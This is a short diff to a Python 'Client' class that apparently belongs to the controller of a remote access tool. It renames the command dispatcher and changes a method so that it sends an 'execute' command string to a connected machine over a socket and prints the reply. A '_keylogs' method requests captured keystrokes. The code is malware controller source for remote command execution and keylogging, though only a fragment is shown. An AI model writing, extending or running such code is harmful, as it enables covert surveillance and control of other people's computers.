@@ -68,7 +68,7 @@ class Client:
 
     # command handling ---------------------------------------------------------
 
-    def execute(self, cmd: str, *args) -> None:
+    def handle(self, cmd: str, *args) -> None:
         """Called from the manager when executing a command on a specified client object.
 
         Args:
@@ -85,8 +85,10 @@ class Client:
             # call function and pass anny arguments up to the function's argument limit
             func(*args[: func.__code__.co_argcount])
 
-    def _command(self, command_string: str) -> None:
-        self._send("command", command_string)
+    def _execute(self, command_string: str) -> None:
+        self._send("execute", command_string)
+        response = self._sock.recv(1024).decode("utf-8")
+        print(response)
 
     def _keylogs(self) -> None:
         self._send("keylogs")
